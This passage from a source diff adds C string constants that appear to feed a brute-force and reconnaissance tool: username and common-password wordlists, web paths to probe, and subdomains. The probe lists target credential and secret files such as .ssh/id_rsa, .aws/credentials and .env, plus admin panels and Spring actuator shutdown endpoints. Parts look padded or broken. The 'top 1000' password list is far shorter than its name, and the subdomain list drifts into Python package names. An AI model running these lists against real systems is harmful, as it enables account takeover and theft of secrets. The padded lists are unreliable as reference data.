ner\nemployee\ncontractor\nintern\ntemp\nvisitor\nanonymous\nanon\npublic\nshared\ncommon\nbasic\nstandard\npremium\ngold\nplatinum\nvip\nfree\ntrial\nbeta\nalpha\nrc\nsysadmin\nsystem\nadmins\nadministrators\nsuperadmin\nsuperuser\nsupervisor\nroot1\nroot2\ntoor\nwheel\nuucp1\nadmin1\nadmin2\nadmin3\nadmin123\nadminadmin\npassword\nadm\nadminuser\nadmin_user\nweb_admin\nsystem_admin\nuser1\nuser2\nuser3\njoe\njohn\njane\nmary\nbob\nalice\ncharlie\ndavid\neve\nfrank\ngrace\nhenry\nivan\njack\nkate\nleo\nmike\nnina\noscar\npaul\nquincy\nrobert\nsara\ntom\numa\nvictor\nwendy\nxavier\nyolanda\nzach\n01\n02\n03\n04\n05\n06\n07\n08\n09\n10\n100\n101\n123\n1234\n12345\n123456\n1234567\n12345678\n123456789\n1\n2\n3\n4\n5\n6\n7\n8\n9\nabc\nabcd\nabcde\nabcdef\nabcdefg\nabcdefgh\nabcdefghi\nabcdefghij\nadmin01\nadmin02\nadmin10\nadmin11\nadmin99\nadministrator1\nadministrator01\nadministrator2\nroot1\nroot01\nroot10\nroot11\nuser01\nuser02\nuser10\nuser99\ntest01\ntest02\ntest10\ntest99\nguest1\nguest01\nguest10\nguest99\nsupport1\nsupport01\nsupport10\nsupport99\noperator1\noperator01\noperator10\noperator99\nadmin_default\nsystem_default\ndefault_admin\ndefault_user\ndefault_test\ndefault_root\ndefault1\ndefault01\ndefault10\ndefault99\nadmin_test\ntest_admin\ntest_user\nadmin_user\nuser_test\nuser_admin\nadmin_root\nadmin_system\nadmin_login\nlogin_admin\nlogin_test\nlogin_user\nlogin_default\ndefault_login\nadmin_account\naccount_admin\naccount_test\naccount_user\nadmin_dba\ndba_admin\ndba_test\ndba_user\ndba_default\ndefault_dba\ndba1\ndba2\ndba3\ndba01\ndba10\ndba99\nadmin_dev\ndev_admin\ndev_test\ndev_user\ndev_default\ndefault_dev\nadmin_qa\nqa_admin\nqa_test\nqa_user\nqa_default\ndefault_qa\nadmin_stage\nstage_admin\nstage_test\nstage_user\nstage_default\ndefault_stage\nadmin_prod\nprod_admin\nprod_test\nprod_user\nprod_default\ndefault_prod\nadmin_release\nrelease_admin\nrelease_test\nrelease_user\nadmin_beta\nbeta_admin\nbeta_test\nbeta_user\nadmin_alpha\nalpha_admin\nalpha_test\nalpha_user\nadmin_rc\nrc_admin\nrc_test\nrc_user\ngeneral\nbasicuser\nstandarduser\npremiumuser\ngolduser\nvipuser\nfreeuser\ntrialuser\nbetauser\nalphauser\nrcuser\ndev1\ndev2\ndev3\ndev4\ndev5\nqa1\nqa2\nqa3\nstage1\nstage2\nstage3\nprod1\nprod2\nprod3\nrelease1\nrelease2\nbeta1\nbeta2\nalpha1\nalpha2\nrc1\nrc2\noracle1\noracle01\npostgres1\npostgres01\nmysql1\nmysql01\nsqlserver1\nsqlserver01\nsa1\nsa01\nweblogic1\nweblogic01\nwebsphere1\nwebsphere01\ntomcat1\ntomcat01\njboss1\njboss01\nmongo1\nmongo01\nredis1\nredis01\ncouchdb1\ncouchdb01\nelasticsearch1\nelasticsearch01\nmemcache1\nmemcache01\ncassandra1\ncassandra01\nrabbitmq1\nrabbitmq01\nactivemq1\nactivemq01\nzookeeper1\nzookeeper01\nkafka1\nkafka01\nstorm1\nstorm01\nspark1\nspark01\nhadoop1\nhadoop01\nhdfs1\nhdfs01\nyarn1\nyarn01\nhbase1\nhbase01\nhive1\nhive01\npig1\npig01\nimpala1\nimpala01\noozie1\noozie01\nhue1\nhue01\nsentry1\nsentry01\nranger1\nranger01\natlas1\natlas01\nzeppelin1\nzeppelin01\njupyter1\njupyter01\nrstudio1\nrstudio01\ndatabricks1\ndatabricks01\nsnowflake1\nsnowflake01\nredshift1\nredshift01\nbigquery1\nbigquery01\ndatabase1\ndatabase01\ndb1\ndb01\ndba1\ndba01\nweb1\nweb01\nwww1\nwww01\napp1\napp01\nmanager1\nmanager01\nsecretary1\nsecretary01\ndemo1\ndemo01\ndaemon1\ndaemon01\nbin1\nbin01\nnobody1\nnobody01\noperator1\noperator01\nftp1\nftp01\nmail1\nmail01\nsmtp1\nsmtp01\npop3_1\npop3_01\nimap1\nimap01\ndns1\ndns01\nnamed1\nnamed01\nbind1\nbind01\nlist1\nlist01\nirc1\nirc01\nnews1\nnews01\nman1\nman01\nproxy1\nproxy01\nlp1\nlp01\nuucp1\nuucp01\nrpm1\nrpm01\napache1\napache01\nhttpd1\nhttpd01\nnginx1\nnginx01\nlighttpd1\nlighttpd01\ngames1\ngames01\nmaster\nslave\nclone\nmirror\nstandby\nreplica\nshard\ncluster\nleader\nfollower\nworker\nbroker\nrouter\ngateway\nedge\ncore\nrelay\nproxy01\nbackup01\nbackup1\nbackupuser\nbackupadmin\nrescue\nemergency\nbreakglass\nbreak_glass\nbreakadmin\nemergencyadmin\nrescueadmin\nfirstboot\nfirstuser\nsetup\nsetupuser\nsetupadmin\ninstaller\ninstall\ninstall_admin\nadminadmin1\ntestadmin\ntestroot\ntestguest\ntestoperator\ntestmail\ntestdba\ntestmanager\ntestsa\ntestoracle\ntestpostgres\ntestmysql\ntestsqlserver\ntestweblogic\ntestwebsphere\ntesttomcat\ntestjboss\ntestmongo\ntestredis\ntestcouchdb\ntestelasticsearch\ntestmemcache\ntestcassandra\ntestrabbitmq\ntestactivemq\ntestzookeeper\ntestkafka\nadmin_master\nmaster_admin\nadmin_slave\nslave_admin\nclone_admin\nadmin_clone\nadmin_mirror\nmirror_admin\nadmin_standby\nstandby_admin\nadmin_replica\nreplica_admin\nadmin_shard\nshard_admin\nadmin_cluster\ncluster_admin\nadmin_leader\nleader_admin\nadmin_follower\nfollower_admin\nadmin_worker\nworker_admin\nadmin_broker\nbroker_admin\nadmin_router\nrouter_admin\nadmin_gateway\ngateway_admin\nadmin_edge\nedge_admin\nadmin_core\ncore_admin\nadmin_relay\nrelay_admin\nadmin_proxy\nproxy_admin\nadmin_backup\nbackup_admin\nadmin_rescue\nrescue_admin\nadmin_emergency\nemergency_admin\nadmin_setup\nsetup_admin\nadmin_install\ninstall_admin\n"
+    "x\ny\nz\na\nb\nc\nd\ne\nf\ng\nh\ni\nj\nk\nl\nm\nn\no\np\nq\nr\ns\nt\nu\nv\nw\n"
+    "joe@example.com\njohn@example.com\nadmin@example.com\nroot@example.com\nuser@example.com\ntest@example.com\nguest@example.com\nsupport@example.com\nservice@example.com\nsales@example.com\nmarketing@example.com\nhr@example.com\nlegal@example.com\nfinance@example.com\nit@example.com\ndevops@example.com\nsecurity@example.com\ncontact@example.com\ninfo@example.com\nhelp@example.com\nadministrator@example.com\nwebmaster@example.com\npostmaster@example.com\nhostmaster@example.com\n"
+    ;
+
+static const char* kAuthPasswordsTop1000 =
+    "password\n123456\n12345678\n123456789\nqwerty\nabc123\nletmein\nmonkey\n1234567890\ndragon\nbaseball\niloveyou\ntrustno1\n1234567\nsunshine\nmaster\n123123\nwelcome\nshadow\nashley\nfootball\njesus\nmichael\nninja\nmustang\npassword1\npassword123\nadmin\nadmin123\nroot\nroot123\nguest\nguest123\nuser\nuser123\ntest\ntest123\noracle\nmysql\npostgres\nsa\nsqlserver\nsupport\nlogin\nchangeme\nchange_me\ndefault\nsystem\nadministrator\nP@ssw0rd\nP@ssword\nPassword1\nPassword123\nPassword\npassword!\nPassword!\nP@ssword1\nP@ssw0rd1\nadmin@123\nroot@123\nuser@123\ntest@123\noracle@123\nmysql@123\npostgres@123\nadmin#123\nroot#123\nadmin1\nadmin12\nadmin1234\nroot1\nroot12\nroot1234\nP@ssw0rd!\nP@ssword!\nP@ssword123\nP@ssw0rd123\nP@ssword!23\nP@ssw0rd!23\nadmin!23\nadmin!@#\nQwerty123\nqwerty123\nqwerty1\nqwerty12\nqwerty1234\nqwertyuiop\nasdfgh\nasdfghjkl\nzxcvbn\nzxcvbnm\n!@#$%^&*\n!@#$%^&*()\n!QAZ@WSX\n!QAZ2wsx\nQwerty!\nQ1w2e3r4\nq1w2e3r4\nq1w2e3r4t5\nQ1w2e3r4t5\nq1w2e3r4t5y6\nQ1w2e3r4t5y6\nq1w2e3\nQ1w2e3\nq1w2\nQ1w2\nq1w2e3r4!\nQ1w2e3r4!\nadmin2024\nadmin2023\nadmin2022\nadmin2021\nadmin2020\nadmin2019\nadmin2018\nadmin2017\nadmin2016\nadmin2015\nroot2024\nroot2023\nroot2022\nroot2021\nroot2020\nWelcome1\nWelcome123\nWelcome2024\nWelcome2023\nWelcome2022\nWelcome2021\nwelcome1\nwelcome123\nwelcome2024\nWinter2024\nSpring2024\nSummer2024\nAutumn2024\nFall2024\nWinter2023\nSpring2023\nSummer2023\nAutumn2023\nFall2023\nJanuary2024\nFebruary2024\nMarch2024\nApril2024\nMay2024\nJune2024\nJuly2024\nAugust2024\nSeptember2024\nOctober2024\nNovember2024\nDecember2024\nCompany2024\nCompany123\nCompany!23\nbackup\nbackup1\nbackup123\nbackupbackup\nfirewall\nfirewall1\nfirewall123\nrouter\nrouter1\nrouter123\nswitch\nswitch1\nswitch123\ndmz\ndmz1\ndmz123\nvpn\nvpn1\nvpn123\nvpnuser\nvpnadmin\ncisco\ncisco1\ncisco123\nciscocisco\nhp\nhp1\nhp123\nhphp\ndell\ndell1\ndell123\ndelldell\nibm\nibm1\nibm123\nibmibm\noracle1\noracle12\noracle123\noraclesoracle\nmysql1\nmysql12\nmysql123\nmysqlmysql\npostgres1\npostgres12\npostgres123\npostgrespostgres\nsa1\nsa12\nsa123\nsasa\nsqlserver1\nsqlserver12\nsqlserver123\nsqlserversqlserver\nsupport1\nsupport12\nsupport123\nsupportsupport\nlogin1\nlogin12\nlogin123\nloginlogin\nchangeme1\nchangeme12\nchangeme123\nchangemechangeme\ndefault1\ndefault12\ndefault123\ndefaultdefault\nsystem1\nsystem12\nsystem123\nsystemsystem\nadministrator1\nadministrator12\nadministrator123\nadministratoradministrator\nP4ssw0rd\nP@ssw0rd1!\nP@ssw0rd!!\nP@ssw0rd!@#\nP@ssw0rd@123\nadmin!@#$\nroot!@#$\nuser!@#$\ntest!@#$\noracle!@#$\nmysql!@#$\npostgres!@#$\nadmin#@!\nroot#@!\nadmin!#@\nroot!#@\nadmin@!#\nroot@!#\nIloveyou1\nIloveyou123\niloveyou1\niloveyou123\nIlove123\nIlove1\nIlove\nlove\nlove1\nlove123\nlovelove\nlovelove1\nfreedom\nfreedom1\nfreedom123\nfreedomfreedom\nliberty\nliberty1\nliberty123\nlibertyliberty\nsuper\nsuper1\nsuper123\nsupersuper\nsuperman\nsuperman1\nsuperman123\nbatman\nbatman1\nbatman123\nspiderman\nspiderman1\nspiderman123\nfighter\nfighter1\nfighter123\nstarwars\nstarwars1\nstarwars123\nharley\nharley1\nharley123\nmaster1\nmaster123\nmastermaster\ndragon1\ndragon123\ndragondragon\nbaseball1\nbaseball123\nbaseballbaseball\ntrustno11\ntrustno1234\nninja1\nninja123\nninjaninja\nmustang1\nmustang123\nmustangmustang\nasdf\nasdf1234\nasdf123\nasdfasdf\nzxcvb\nzxcvb123\nzxcv\nzxcv123\nqaz\nqaz123\nqazwsx\nqazwsxedc\n1qaz2wsx\n1qaz@WSX\n1qaz!QAZ\n1qaz2wsx3edc\n1qaz!QAZ2wsx@WSX\nQAZWSX\nQAZWSX123\nqazxsw\nqazxsw123\n!QAZxsw2\n!QAZxsw2#EDC\n1q2w3e\n1q2w3e4r\n1q2w3e4r5t\n1q2w3e4r5t6y\n1q2w3e!\n1Q2w3e!\n1Q2W3E\n1Q2W3E4R\n1234\n5678\n0000\n1111\n2222\n3333\n4444\n5555\n6666\n7777\n8888\n9999\n11111111\n22222222\n00000000\n88888888\n99999999\ndefault1234\nchangeme1234\nP@ssword123!\nP@ssw0rd!23\nP@ssw0rd@!#\nP@ssw0rd123!\nP@ssword1!\nP@ssword!1\nP@ssword!!\nP@ssword@123\nP@ssword!@#\nletmein1\nletmein123\nletmeinplease\nopen\nopen1\nopen123\nopenopen\nopensesame\ncloseme\ncloseme1\ncloseme123\nclosed\nclosed1\nclosed123\nclosedclose\nallowed\nallowed1\nallowed123\nallowedallowed\nblocked\nblocked1\nblocked123\nblockedblocked\nrejected\nrejected1\nrejected123\nrejectedrejected\nfree\nfree1\nfree123\nfreefree\ntrial\ntrial1\ntrial123\ntrialtrial\nbeta\nbeta1\nbeta123\nbetabeta\nalpha\nalpha1\nalpha123\nalphaalpha\nrc\nrc1\nrc123\nrcrc\nstable\nstable1\nstable123\nstablestable\nrelease\nrelease1\nrelease123\nreleaserelease\nprod\nprod1\nprod123\nprodprod\nproduction\nproduction1\nproduction123\nstaging\nstaging1\nstaging123\nstage\nstage1\nstage123\nstagestage\ntest!@#\ntest!23\ntest!@#$\ntest@123\ntest@123!\ntest123!\ntest1234!\ntesttest\ntest_user\ntestuser\ntester\ntester1\ntester123\nguest!@#\nguest@123\nguest123!\nguest1234!\nguestguest\nguest_user\nguestuser\nopensesame!\nopensesame123\nopensesame1\nopensesame@123\nadmin@2024\nadmin@2023\nadmin@2022\nadmin@2021\nadmin@2020\nroot@2024\nroot@2023\nroot@2022\nroot@2021\nroot@2020\nWelcome@2024\nWelcome@2023\nWelcome@2022\nWelcome@2021\nWelcome@2020\nP@ssw0rd@2024\nP@ssw0rd@2023\nP@ssw0rd@2022\nP@ssw0rd@2021\nP@ssw0rd@2020\nWinter@2024\nWinter@2023\nWinter@2022\nWinter@2021\nWinter@2020\nSpring@2024\nSpring@2023\nSpring@2022\nSpring@2021\nSpring@2020\nSummer@2024\nSummer@2023\nSummer@2022\nSummer@2021\nSummer@2020\nAutumn@2024\nAutumn@2023\nAutumn@2022\nAutumn@2021\nAutumn@2020\nFall@2024\nFall@2023\nFall@2022\nFall@2021\nFall@2020\nCompany@2024\nCompany@2023\nCompany@2022\nCompany@2021\nCompany@2020\nbackup@2024\nbackup@2023\nbackup@2022\nbackup@2021\nbackup@2020\nfirewall@2024\nfirewall@2023\nfirewall@2022\nfirewall@2021\nfirewall@2020\nrouter@2024\nrouter@2023\nrouter@2022\nrouter@2021\nrouter@2020\nswitch@2024\nswitch@2023\nswitch@2022\nswitch@2021\nswitch@2020\ndmz@2024\ndmz@2023\ndmz@2022\ndmz@2021\ndmz@2020\nvpn@2024\nvpn@2023\nvpn@2022\nvpn@2021\nvpn@2020\ncisco@2024\ncisco@2023\ncisco@2022\ncisco@2021\ncisco@2020\nhp@2024\nhp@2023\nhp@2022\nhp@2021\nhp@2020\ndell@2024\ndell@2023\ndell@2022\ndell@2021\ndell@2020\nibm@2024\nibm@2023\nibm@2022\nibm@2021\nibm@2020\noracle@2024\noracle@2023\noracle@2022\noracle@2021\noracle@2020\nmysql@2024\nmysql@2023\nmysql@2022\nmysql@2021\nmysql@2020\npostgres@2024\npostgres@2023\npostgres@2022\npostgres@2021\npostgres@2020\nsa@2024\nsa@2023\nsa@2022\nsa@2021\nsa@2020\nsqlserver@2024\nsqlserver@2023\nsqlserver@2022\nsqlserver@2021\nsqlserver@2020\nsupport@2024\nsupport@2023\nsupport@2022\nsupport@2021\nsupport@2020\nadmin_default\nroot_default\nuser_default\ntest_default\nguest_default\nsupport_default\nservice_default\noracle_default\nmysql_default\npostgres_default\nsa_default\nsqlserver_default\nadmin_changeme\nroot_changeme\nuser_changeme\ntest_changeme\nguest_changeme\nsupport_changeme\nservice_changeme\noracle_changeme\nmysql_changeme\npostgres_changeme\nsa_changeme\nsqlserver_changeme\nadmin_default1\nadmin_default123\nroot_default1\nroot_default123\nuser_default1\nuser_default123\ntest_default1\ntest_default123\nguest_default1\nguest_default123\nadmin_changeme1\nadmin_changeme123\nroot_changeme1\nroot_changeme123\nuser_changeme1\nuser_changeme123\ntest_changeme1\ntest_changeme123\nguest_changeme1\nguest_changeme123\nP@ssword_default\nP@ssword_default1\nP@ssword_default123\nP@ssword_changeme\nP@ssword_changeme1\nP@ssword_changeme123\n"
+    ;
+
+static const char* kDirsCommon100 =
+    "admin\nadmin/\nadministrator\nadministrator/\nphpmyadmin\nphpmyadmin/\nlogin\nlogin/\nwp-admin\nwp-admin/\nwp-login.php\ncpanel\ncpanel/\nwebmail\nwebmail/\nuser\nuser/\nuserlogin\nlogon\nlogon/\nbackup\nbackup/\nbackups\nbackups/\nold\nold/\nbak\nbak/\nbackup.zip\nbackup.tar.gz\nbackup.sql\nbackup.bak\nweb.config\n.env\n.git/\n.git/HEAD\n.git/config\n.git/index\n.svn/\n.htaccess\n.htpasswd\n.DS_Store\nrobots.txt\nsitemap.xml\nsitemap.xml.gz\nserver-status\nserver-info\nphpinfo.php\ninfo.php\ntest.php\nconfig.php\nconfig.php.bak\nconfig.ini\nconfig.inc.php\nconfig.json\nconfig.yml\nconfig.yaml\nweb.config.bak\n.travis.yml\n.gitignore\n.gitlab-ci.yml\n.dockerignore\ndocker-compose.yml\nDockerfile\npackage.json\npackage-lock.json\nyarn.lock\ncomposer.json\ncomposer.lock\nGemfile\nGemfile.lock\nrequirements.txt\nmanifest.json\nappspec.yml\napi\napi/\napi/v1\napi/v2\nv1\nv2\nrest\nrest/\ngraphql\ngraphql/\nswagger\nswagger.json\nswagger-ui\nswagger-ui/\nopenapi.json\nactuator\nactuator/\nactuator/env\nactuator/health\nactuator/info\nactuator/metrics\nactuator/heapdump\nmetrics\nstatus\nhealth\nhealthcheck\nready\nupload\nuploads\nuploads/\ndownload\ndownloads\ndownloads/\ntmp\ntmp/\ntemp\ntemp/\ncache\ncache/\nlog\nlogs\nlogs/\ndebug\ndebug.log\nerror.log\naccess.log\ntest\ntest/\nstaging\nstaging/\nbeta\nbeta/\ndev\ndev/\nold-site\nold-site/\nlegacy\nlegacy/\n";
+
+static const char* kDirsQuickhits =
+    ".git/HEAD\n.git/config\n.git/index\n.git/logs/HEAD\n.git/COMMIT_EDITMSG\n.svn/entries\n.svn/wc.db\n.hg/store/00manifest.i\n.bzr/checkout/dirstate\n.DS_Store\n.env\n.env.local\n.env.production\n.env.development\n.env.example\n.env.backup\n.env.bak\n.env.save\n.env.old\n.env.orig\n.htaccess\n.htpasswd\n.bash_history\n.zsh_history\n.python_history\n.sh_history\n.mysql_history\n.psql_history\n.netrc\n.ssh/id_rsa\n.ssh/authorized_keys\n.ssh/known_hosts\n.ssh/config\n.aws/credentials\n.aws/config\n.kube/config\n.docker/config.json\n.npmrc\n.yarnrc\n.bashrc\n.profile\nweb.config\nweb.config.bak\nweb.config.old\nweb.config.orig\nweb.config.save\nweb.config~\napp.config\napp.config.bak\nconfig.json\nconfig.json.bak\nconfig.xml\nconfig.xml.bak\nconfig.yml\nconfig.yaml\nconfig.ini\nconfig.toml\nconfig.cfg\nconfig.conf\nconfig.php\nconfig.php.bak\nconfig.php.old\nconfig.php~\nconfig.inc.php\nconfig.inc.php.bak\nsettings.json\nsettings.xml\nsettings.yml\nsettings.yaml\nsettings.ini\nsettings.toml\nsettings.cfg\nsettings.conf\nsettings.php\nsettings.php.bak\ncredentials.json\ncredentials.xml\ncredentials.yml\ncredentials.yaml\ncredentials.ini\ncredentials.toml\ncredentials.cfg\ncredentials.conf\ncredentials.php\nsecrets.json\nsecrets.xml\nsecrets.yml\nsecrets.yaml\nsecrets.ini\nsecrets.toml\nsecrets.cfg\nsecrets.conf\nsecrets.php\nphpinfo.php\ninfo.php\ntest.php\nshell.php\nupload.php\nfile.php\nbackup.sql\nbackup.tar.gz\nbackup.zip\nbackup.tar\nbackup.gz\nbackup.tgz\nbackup.7z\nbackup.rar\nbackup.bak\nbackup.bak.zip\nbackup.bak.tar.gz\ndump.sql\ndump.sql.gz\ndump.sql.zip\ndatabase.sql\ndatabase.sql.gz\ndb.sql\ndb.sql.gz\ndev.sql\ndev.sql.gz\nprod.sql\nprod.sql.gz\nstage.sql\nstage.sql.gz\ndata.sql\ndata.sql.gz\nmysqldump.sql\nmysqldump.sql.gz\npg_dump.sql\npg_dump.sql.gz\nold/\nbak/\nbackup/\nbackups/\narchive/\narchives/\ntmp/\ntemp/\ncache/\nlog/\nlogs/\nstaging/\ndev/\nbeta/\nlegacy/\ntest/\ndebug/\nadmin/\nadmin/login.php\nadmin/index.php\nadmin/config.php\nadmin/login\nadmin/index\nadmin/config\nadministrator/\nphpmyadmin/\nphpmyadmin/index.php\nphpmyadmin/scripts/setup.php\nadminer.php\ncpanel/\nwhm/\nwebmail/\nrobots.txt\nsitemap.xml\nsitemap.xml.gz\nserver-status\nserver-info\nactuator\nactuator/env\nactuator/health\nactuator/info\nactuator/heapdump\nactuator/threaddump\nactuator/loggers\nactuator/metrics\nactuator/configprops\nactuator/mappings\nactuator/beans\nactuator/auditevents\nactuator/conditions\nactuator/scheduledtasks\nactuator/sessions\nactuator/caches\nactuator/httptrace\nactuator/jolokia\nactuator/refresh\nactuator/restart\nactuator/shutdown\n.idea/\n.idea/workspace.xml\n.vscode/\n.vscode/settings.json\nThumbs.db\nDesktop.ini\ndesktop.ini\n";
+
+static const char* kDirsBig =
+    "admin\nadministrator\nlogin\nlogon\nuser\nusers\nphpmyadmin\nadminer\nwp-admin\nwp-login.php\nwp-config.php\nwp-content\nwp-includes\ncpanel\nwhm\nwebmail\nmail\nuserlogin\nuserlogin.aspx\nlogin.aspx\nadmin.aspx\nadministrator.aspx\nlogin.php\nadmin.php\nadministrator.php\nlogin.html\nadmin.html\nadministrator.html\nbackup\nbackups\narchive\narchives\nold\nold_site\nold-site\nbak\nbaks\nbackup.zip\nbackup.tar.gz\nbackup.tar\nbackup.gz\nbackup.tgz\nbackup.7z\nbackup.rar\nbackup.sql\nbackup.bak\nbackup.bak.zip\nbackup.bak.tar.gz\ndump.sql\ndump.sql.gz\ndatabase.sql\ndb.sql\nweb.config\n.env\n.git\n.git/HEAD\n.git/config\n.git/index\n.git/logs/HEAD\n.git/COMMIT_EDITMSG\n.svn\n.svn/entries\n.svn/wc.db\n.hg\n.bzr\n.htaccess\n.htpasswd\n.DS_Store\nrobots.txt\nsitemap.xml\nsitemap.xml.gz\nserver-status\nserver-info\nphpinfo.php\ninfo.php\ntest.php\nconfig.php\nconfig.php.bak\nconfig.ini\nconfig.inc.php\nconfig.json\nconfig.yml\nconfig.yaml\nconfig.xml\nweb.config.bak\nweb.config.old\nweb.config.orig\napp.config\napp.config.bak\n.travis.yml\n.gitignore\n.gitlab-ci.yml\n.dockerignore\ndocker-compose.yml\nDockerfile\npackage.json\npackage-lock.json\nyarn.lock\ncomposer.json\ncomposer.lock\nGemfile\nGemfile.lock\nrequirements.txt\nmanifest.json\nappspec.yml\napi\napi/v1\napi/v2\nv1\nv2\nrest\ngraphql\nswagger\nswagger.json\nswagger-ui\nopenapi.json\nactuator\nactuator/env\nactuator/health\nactuator/info\nactuator/metrics\nactuator/heapdump\nactuator/threaddump\nactuator/loggers\nactuator/mappings\nactuator/configprops\nactuator/beans\nactuator/auditevents\nactuator/conditions\nactuator/scheduledtasks\nactuator/sessions\nactuator/caches\nactuator/httptrace\nactuator/jolokia\nactuator/refresh\nactuator/restart\nactuator/shutdown\nmetrics\nstatus\nhealth\nhealthcheck\nready\nupload\nuploads\ndownload\ndownloads\ntmp\ntemp\ncache\nlog\nlogs\ndebug\ndebug.log\nerror.log\naccess.log\ntest\nstaging\nbeta\ndev\nlegacy\nlive\npublic\nprivate\ninternal\nexternal\nsecure\nsecret\ntop-secret\nrestricted\nintranet\nportal\ndashboard\ncontrol\ncontrolpanel\ncpanel\nwebadmin\nhostadmin\nsysadmin\nsuperadmin\nsuperuser\nsudo\nsudoers\naccount\naccounts\nauth\nauthentication\nauthorize\nauthorization\noauth\noauth2\nopenid\nopenid-connect\nsaml\nsso\nfederation\nfederate\nfederated\nfederate_login\nfederate-login\nfederation_login\nfederation-login\nsignin\nsignup\nregister\nregistration\nrecover\nrecovery\npasswordreset\npassword-reset\npassword_reset\nforgot\nforgotpassword\nforgot-password\nforgot_password\nreset\nresetpassword\nreset-password\nreset_password\nverify\nverification\nactivate\nactivation\nconfirm\nconfirmation\nresend\nresend-confirmation\nresend_confirmation\nemail-verification\nemail_verification\nphone-verification\nphone_verification\n2fa\nmfa\ntwo-factor\ntwofactor\ntwo_factor\nmultifactor\nmulti-factor\nmulti_factor\nauthenticator\nauthenticator-app\nyubikey\nfido\nfido2\nwebauthn\nu2f\notp\ntotp\nhotp\nbackup-codes\nbackup_codes\nbackupcodes\nrecovery-codes\nrecovery_codes\nrecoverycodes\nsession\nsessions\ntoken\ntokens\napi-key\napi_key\napikey\napi-keys\napi_keys\napikeys\nbearer\njwt\njwt-token\njwt_token\njwttoken\nrefresh-token\nrefresh_token\nrefreshtoken\naccess-token\naccess_token\naccesstoken\nid-token\nid_token\nidtoken\nuserinfo\nusersession\nuser-session\nuser_session\nuserinfo.json\nuser.json\nusers.json\naccount.json\naccounts.json\nprofile.json\nprofiles.json\nfile\nfiles\nfilemanager\nfile-manager\nfile_manager\nfilemgr\nfilebrowser\nfile-browser\nfile_browser\nfm\nmanager\nmgr\nbrowser\nrouter\nswitch\nfirewall\nproxy\ngateway\nbalancer\nload-balancer\nload_balancer\nloadbalancer\ncluster\nshard\ndatabase\ndb\ndatabases\ndbs\nmongo\nmongodb\nredis\ncouch\ncouchdb\nelastic\nelasticsearch\nmemcache\nmemcached\ncassandra\nrabbitmq\nactivemq\nkafka\nzookeeper\nzeppelin\njupyter\nnotebook\nnotebooks\nrstudio\ndatabricks\nsnowflake\nredshift\nbigquery\noracle\nmysql\npostgres\npostgresql\nsqlserver\nsql\nmssql\nmssqlserver\nmariadb\nsqlite\nsqlite3\nfirebird\ninterbase\ninformix\nsybase\nteradata\nverticadb\nvertica\nclickhouse\ngreenplum\nnetezza\nkdb\nkdbplus\nkdb+\nclickhouse\ndruid\nhdfs\nyarn\nhbase\nhive\npig\nimpala\noozie\nhue\nsentry\nranger\natlas\n";
+
+static const char* kSubdomainsTop1000 =
+    "www\nmail\nremote\nblog\nwebmail\nserver\nns1\nns2\nsmtp\nsecure\nvpn\nm\nshop\nftp\nmail2\ntest\nportal\nns\nweb\nadmin\nforum\nnews\nadminis\nintranet\noffice\nbeta\napi\ndev\nimages\nimg\ncdn\nstatic\nassets\nstaging\nstg\nuat\nqa\nproduction\nprod\ndocs\ndoc\ncatalog\nstore\napp\napps\nlogin\nauth\nsso\nidp\nupload\ndownload\nfiles\nbackup\ncloud\ndb\nsql\nmysql\noracle\nelastic\nelasticsearch\nkibana\ngrafana\nprometheus\njenkins\ngitlab\ngit\nbitbucket\ngithub\nsvn\nci\ncd\nbuild\ndeploy\nartifactory\nnexus\nregistry\ndocker\nk8s\nkubernetes\nmonitor\nmonitoring\nstatus\nmetrics\nlogging\nlogs\nlog\nelk\nfluentd\nlogstash\nsentry\nsplunk\ndatadog\nnewrelic\npagerduty\nslack\nzoom\nteams\nmeet\nwebex\njabber\nxmpp\nirc\nchat\nmessenger\nim\nsip\nasterisk\nfreepbx\n3cx\nturnserver\nstun\nturn\nuc\nucpresence\nucvideo\nuc-rooms\nucsignal\nucprovision\nrelay\nrelay1\nrelay2\nrouter\nrouter1\nrouter2\nswitch\nswitch1\nswitch2\nfirewall\nfirewall1\nfirewall2\nfw\nfw1\nfw2\nipv6\nipv4\nipsec\nopenvpn\nwireguard\npptp\nl2tp\nradius\nldap\nopenldap\nactivedirectory\nad\nadds\nadcs\nadfs\nazuread\noidc\nokta\nauth0\nonelogin\nping\npingfederate\npingone\ncas\nyubico\nyubikey\nduo\nfidocompliance\nfido2\nu2f\nwebauthn\nrecaptcha\nhcaptcha\ncloudflare\nakamai\nfastly\nmaxcdn\nstackpath\nincapsula\nimperva\nf5\nf5-bigip\nbigip\nbig-ip\nbigipgtm\nbigipltm\nbigipasm\nbigipafm\nbigipapm\nbigipswg\nbigippsm\nbigipea\nbigipac\nbigipsystem\nbigipdns\nbigipsdcli\nadc\ngslb\nlb\nslb\nbalance\nbalancer\nload-balancer\nload_balancer\nha\nha-proxy\nhaproxy\nnginx\napache\ntomcat\njetty\nundertow\nresin\nweblogic\nwebsphere\nliberty\ngrails\nplay\nrails\nrack\ndjango\nflask\nfastapi\nstarlette\ntornado\npyramid\nbottle\ncherrypy\nturbogears\nweb2py\nsanic\nquart\naiohttp\nfalcon\nhug\napistar\nresponder\nklein\nuvicorn\ndaphne\ngunicorn\nuwsgi\ngevent\ntwisted\nasync\nasync_io\nasyncio\ntrio\ncurio\nanyio\ngevent-mongo\nmongo-engine\nmongoengine\nflask-mongoengine\nflask-mongo\npymongo\nmotor\npymongoarrow\npysolr\npyelasticsearch\nelasticsearch-dsl\nelasticsearch-py\npyes\npyhive\npyhdfs\npyspark\npyspark2\npyspark3\nspark-py\nsparkpython\nsparkpy\npy4j\nschemaorg\nschema-org\nschema_org\nschema\ndatahub\namundsen\nlinkedin\nlnkd\nfacebook\nfb\ntwitter\nx\ntwt\ninstagram\nig\nyoutube\nyt\nvimeo\ntwitch\nreddit\nrd\ndiscord\nstackoverflow\nso\nquora\nquora-com\nquora.com\nquoradigest\nquora-search\nproductionapi\napi-prod\napi-staging\napi-stg\napi-uat\napi-qa\napi-dev\napi-dev1\napi-dev2\napi-test\napi1\napi2\napi3\napi4\napi5\nv1-api\nv2-api\nv3-api\nv1.api\nv2.api\nv3.api\napi.v1\napi.v2\napi.v3\nrest-api\nrest_api\nrestapi\nrestful\nrestful-api\nrestful_api\nrestfulapi\ngraphql-api\ngraphql_api\ngraphqlapi\ngraphql.v1\ngraphql.v2\ngraphql.v3\nws\nwebsocket\nwss\nrt\nrealtime\nlive\nlive-stream\nlivestream\nbroadcast\nstream\nstreaming\nrtmp\nrtsp\nhls\ndash\nwebrtc\nturn1\nturn2\nstun1\nstun2\nice\nuc-rooms-1\nuc-rooms-2\nimg1\nimg2\